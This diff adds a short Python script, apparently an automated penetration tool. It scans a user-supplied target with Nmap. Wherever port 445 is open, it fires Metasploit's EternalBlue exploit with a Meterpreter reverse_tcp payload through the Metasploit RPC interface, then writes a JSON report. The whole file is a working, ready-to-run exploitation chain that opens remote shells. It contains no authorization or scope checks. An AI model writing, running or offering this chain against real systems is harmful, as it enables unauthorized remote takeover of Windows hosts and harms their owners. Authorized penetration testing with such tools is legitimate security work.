@@ -1,0 +1,49 @@
+#!/usr/bin/env python3
+import json
+import nmap
+from pymetasploit3.msfrpc import MsfRpcClient
+
+def run_nmap(target: str):
+    nm = nmap.PortScanner()
+    nm.scan(hosts=target, arguments='-T4 -A -oX -')
+    host = target
+    report = []
+    for proto in nm[host].all_protocols():
+        for port in nm[host][proto].keys():
+            info = nm[host][proto][port]
+            report.append({
+                "port": port,
+                "state": info["state"],
+                "name": info.get("name"),
+                "product": info.get("product"),
+                "version": info.get("version"),
+            })
+    return report
+
+def exploit_with_msf(host, services):
+    client = MsfRpcClient('msf', port=55552)
+    results = []
+    for svc in services:
+        if svc['port'] == 445:
+            mod = client.modules.use('exploit', 'windows/smb/ms17_010_eternalblue')
+            mod['RHOSTS'] = host
+            resp = mod.execute(payload='windows/meterpreter/reverse_tcp')
+            results.append({"module": mod.fullname, "job_id": resp['job_id']})
+    return results
+
+def main():
+    tgt = input("Target IP/domain: ").strip()
+    print(f"[+] Scanning {tgt} with Nmap...")
+    services = run_nmap(tgt)
+    print(json.dumps(services, indent=2))
+
+    print(f"[+] Exploiting services on {tgt}...")
+    exploits = exploit_with_msf(tgt, services)
+    print(json.dumps(exploits, indent=2))
+
+    with open('autopent_report.json', 'w') as f:
+        json.dump({"services": services, "exploits": exploits}, f, indent=2)
+    print("[✔] Report saved: autopent_report.json")
+
+if __name__ == '__main__':
+    main()
